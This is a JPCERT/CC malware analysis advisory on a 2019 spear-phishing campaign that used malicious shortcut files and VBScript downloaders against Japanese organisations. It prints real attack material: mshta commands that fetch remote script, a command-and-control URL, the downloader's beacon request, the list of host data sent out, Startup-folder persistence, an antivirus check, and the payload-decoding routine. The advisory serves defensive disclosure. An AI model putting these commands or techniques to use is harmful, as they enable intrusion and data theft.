Email
As of June 2019, JPCERT/CC has observed targeted emails to some Japanese
organisations. These emails contain a URL to a cloud service and convince recipients to
download a zip file which contains a malicious shortcut file. This article will describe the
details of the attack method.

How the VBScript downloader is launched
The zip file downloaded from the URL in the email contains a password-protected decoy
document and a shortcut file “Password.txt.lnk”. This shortcut file contains some commands,
and they run when the file is executed. The below image illustrates the flow of events from
the shortcut file being executed until the VBScript-based downloader is launched.

events from running the shortcut file to infecting a host
The shortcut file contains the following command:
C:\Windows\System32\mshta.exe https://bit.ly/31O88c3

When a user accesses the shortened URL, they will be redirected to the following site, and
an HTML file containing the VBScript (Figure 2) is downloaded.

Figure 2： HTML file downloaded by the shortcut file
The behaviour of the VBScript is described in Figure 3. First, it creates and displays a text
file that contains the password for the decoy document. Then, it creates a VBS file
(oezjrjua.vbs) in %TEMP% directory and executes it. It also lists the processes running in the
environment and checks whether any of them contains specific strings ("hudongf" or
"qhsafe"). If these are not included, then a shortcut file (xBoxOne.lnk) is created in the
Startup folder. It is assumed that this process is meant to check strings that Qihoo 360
security products contain (zhudongfangyu.exe, qhsafemain.exe).

Details of xBoxOne.lnk
xBoxOne.lnk is a shortcut file and contains the following command:
C:\Windows\System32\mshta.exe https://bit.ly/2SGs76y

When a user accesses the shortened URL, they will be redirected to the following site:
http://update.gdrives.top:8080/open?
id=b7hMO0D%2ByNbNZSqXu4Putub%2BZLLqg/S66Foz0YKUjety914cQmWz32MV6BE44pEd

This shortcut file is created in the Startup folder and executed when the login is processed.
As of 26 June 2019, JPCERT/CC was not able to confirm the details of the site as the
hostname could not be resolved.
Details of oezjrjua.vbs
oezjrjua.vbs is a downloader which sends a POST request every 3 minutes and executes the
received data as VBScript. The following is an example.

4/11

POST /open?topics=s9[random 3-digit numeric]
HTTP/1.1
Accept: */*
Accept-Language: ja
UA-CPU: AMD64
Accept-Encoding: gzip, deflate

Cache-Control: no-cache
200

Details of VBScript downloaded by oezjrjua.vbs
JPCERT/CC has confirmed that the VBScript (Figure 4) is received and executed in
response to the POST request from oezjrjua.vbs.

5/11

Figure 4：VBScript executed by oezjrjua.vbs (snipped)
The executed VBScript collects information of the infected device and sends it to the
attacker’s server every minute. The following information is sent:
Username
Host name
6/11

OS version
OS install date
OS run time
Time zone
CPU name
Execution path of oezjrjua.vbs
Network adapter information
List of running processes
If the response to the data contains “20”, encoded data will be downloaded. It can be
decoded with the following codes:
n=InStr(1,res,"#")
key=CLng("&h" & Mid(res,1,n-1))
psc=Mid(ret,n+1,Len(res)-n)
sc=base64dec(psc)
psc=CStr(xor(sc,key))
NStep=base64dec(psc)

// Finds # in the response
// Extract the key
// Extracts encoded data
// Base64 decoding (1st time)
// XOR processing on the key
// Base64 decoding (2nd time)

The decoded data is expected to be VBScript, and it will be executed when it is correctly
decoded. As of now, we have no clue about what kind of malware will be downloaded as a
result since the encoded data is not accessible. It is assumed that attackers would inject
some malicious files according to the victim’s environmental information .

Access to the shortened URL
JPCERT/CC observed a limited number of access to the shortened URL (Figure 5). This
implies that the attack was conducted against a very limited range of targets.

In closing
In this series of attacks, we have observed that attackers change some parts of encoding
and conditions for each attempt. It is likely that this type of attack continues with some
customisation. Details about the shortcut file is available in Appendix A, list of samples in
7/11

Appendix B and C&C servers in Appendix C.
The hash values and C&C servers of some variants are listed in Appendix D and E . Please
make sure that none of your devices is communicating to the C&C servers listed in Appendix
C or E. These samples were mostly decoy documents with subjects about cryptocurrency.
We are aware that some of these documents have been sent to organisations that are
related to cryptocurrencies. We assume that this attack campaign specifically targets
cryptocurrency operators and related entities.
